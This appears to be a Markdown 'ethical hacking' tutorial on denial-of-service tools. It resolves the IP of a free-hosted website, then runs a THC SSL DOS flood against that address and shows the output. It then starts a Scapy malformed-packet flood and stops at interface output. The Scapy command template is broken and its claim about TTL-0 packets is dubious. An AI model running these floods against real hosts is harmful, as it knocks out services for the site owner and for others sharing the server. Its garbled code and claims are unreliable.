# Technical Dos attacks
Ethical Hacking - Dos attacks on different services.
<hr>

## The different tools
* Metasploit
* Nmap NSE
* Exploit database
* Scapy
<hr>

## DOS/DDOS categories
 * Session abuse.
 * Attacks based on packet volume.
 * Protocol-based attacks.
 * Attacks based on the application layer.
## The tools we are going to use
 * Low Orbit Ion Cannon
 * THC SSL DOS
 * Scapy 
 * Slowloris
 * https://upordown.ultrawebhosting.com/
 <hr>

 # let's try it
 ## 1st tool is a website : https://upordown.ultrawebhosting.com/
<img src="ultra.png" width="100%">
I will check if my site is available or not following service denial attacks.
https://samglishinc.000webhostapp.com
<img src="test.png" width="100%">
we see that the website is available.

## THC SSL DOS
```bash
thc-ssl-dos 
```
```bash
     ______________ ___  _________
     \__    ___/   |   \ \_   ___ \
       |    | /    ~    \/    \  \/
       |    | \    Y    /\     \____
       |____|  \___|_  /  \______  /
                     \/          \/
            http://www.thc.org

          Twitter @hackerschoice

Greetingz: the french underground

./thc-ssl-dos [options] <ip> <port>
  -h      help
  -l <n>  Limit parallel connections [default: 400]
```
how to use : `thc-ssl-dos ip_target --accept`

i want to test my website: 
let's see ip adress

run this command
```bash
dmitry samglishinc.000webhostapp.com
```
Output
```bash
Deepmagic Information Gathering Tool
"There be some deep magic going on"

HostIP:145.14.145.210
HostName:samglishinc.000webhostapp.com

Gathered Inet-whois information for 145.14.145.210
---------------------------------
```

```bash
thc-ssl-dos 145.14.145.210 --accept
```
Output
```bash
Waiting for script kiddies to piss off................
The force is with those who read the source...
Handshakes 0 [0.00 h/s], 1 Conn, 0 Err
Handshakes 4[4.310 h/s], 2 Conn, 0 Err
```
## Scapy
```bash
scapy
```
Output
```bash
INFO: Can't import PyX. Won't be able to use psdump() or pdfdump().
                                      
                     aSPY//YASa       
             apyyyyCY//////////YCa       |
            sY//////YSpcs  scpCY//Pp     | Welcome to Scapy
 ayp ayyyyyyySCP//Pp           syY//C    | Version 2.4.4
 AYAsAYYYYYYYY///Ps              cY//S   |
         pCCCCY//p          cSSps y//Y   | https://github.com/secdev/scapy
         SPPPP///a          pP///AC//Y   |
              A//A            cyP////C   | Have fun!
              p///Ac            sC///a   |
              P////YCpc           A//A   | Craft packets like I craft my beer.
       scccccp///pSP///p          p//Y   |               -- Jean De Clerck
      sY/////////y  caa           S//P   |
       cayCyayP//Ya              pY/Ya
        sY/PsY////YCc          aC//Yp 
         sc  sccaCY//PCypaapyCP//YSs  
                  spCPY//////YPSps    
                       ccaacs         
                                       using IPython 8.18.1
>>> 
```
We will send a packet with a TTL 0, it is a malformed packet which will create confusion for the target server then a service denial we will send millions of requests.

Format `end(dst="ip", ttl=0)/TCP(),iface="",count=2000)`    

see your ip_adress and nerwork interface
```bash
ifconfig
```
Output
```
enp0s25: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether 48:0f:cf:26:c0:3a  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
        device interrupt 20  memory 0xc0700000-c0720000  

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Boucle locale)
        RX packets 11548  bytes 701144 (684.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 11548  bytes 701144 (684.7 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlo1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.20.10.4  netmask 255.255.255.240  broadcast 172.20.10.15
        inet6 fe80::67e4:949a:cdff:e203  prefixlen 64  scopeid 0x20<link>
        ether cc:3d:82:a9:4a:52  txqueuelen 1000  (Ethernet)
        RX packets 370444  bytes 420059777 (400.6 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 335837  bytes 72057554 (68.7 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```